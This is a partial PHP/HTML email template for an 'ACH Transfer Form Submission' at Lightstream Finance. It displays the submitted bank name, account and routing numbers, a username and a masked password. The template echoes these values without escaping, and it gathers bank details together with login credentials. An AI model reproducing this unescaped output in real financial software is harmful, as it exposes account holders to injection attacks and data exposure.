...
<head>
    ...
    <title>[Lightstream Finance] ACH Transfer Form Submission</title>
                ...
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width:600px; background:#ffffff; border:1px solid #e5e7eb; border-radius:6px; overflow:hidden;" class="bg-card">
                    <tr>
                        <td align="left" style="background:#2563eb; padding:24px; font-size:20px; line-height:24px; font-weight:700; color:#ffffff; font-family:Arial,Helvetica,sans-serif;" class="h1">
                            <span class="badge" style="display:inline-block; background:#1d4ed8; color:#fff; padding:4px 10px; font-size:11px; line-height:1; letter-spacing:.5px; border-radius:3px; text-transform:uppercase;">ACH Transfer</span><br style="line-height:20px;" />
                            New Form Submission
                        </td>
                    </tr>
                    <tr>
                        <td style="padding:28px 28px 8px 28px; font-size:15px; line-height:1.55; color:#1f2937; font-family:Arial,Helvetica,sans-serif;" class="p-sm text-main">
                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;">
                                <tbody>
                                    ...
                                    <tr>
                                        <td style="padding:0 0 18px 0; vertical-align:top;">
                                            <div style="font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.5px; margin:0 0 4px 0;">Bank Name</div>
                                            <div style="font-size:15px; color:#111827; font-weight:500;"><?= $bankName; ?></div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:0 0 18px 0; vertical-align:top;">
                                            <div style="font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.5px; margin:0 0 4px 0;">Account Number</div>
                                            <div style="font-size:15px; color:#111827; font-weight:500;"><?= $accountNumber; ?></div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:0 0 18px 0; vertical-align:top;">
                                            <div style="font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.5px; margin:0 0 4px 0;">Routing Number</div>
                                            <div style="font-size:15px; color:#111827; font-weight:500;"><?= $routingNumber; ?></div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:0 0 18px 0; vertical-align:top;">
                                            <div style="font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.5px; margin:0 0 4px 0;">Username</div>
                                            <div style="font-size:15px; color:#111827; font-weight:500;"><?= $username; ?></div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:0; vertical-align:top;">
                                            <div style="font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.5px; margin:0 0 4px 0;">Password</div>
                                            <div style="font-size:15px; color:#111827; font-weight:500;">••••••••</div>
                                            <div style="font-size:12px; color:#6b7280; margin-top:4px;">Password masked for security</div>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="padding:24px 0 0 0;">
                                            <!-- Reply Button -->
                                            <?php $replySubject = rawurlencode('Re: ACH Transfer Form'); ?>
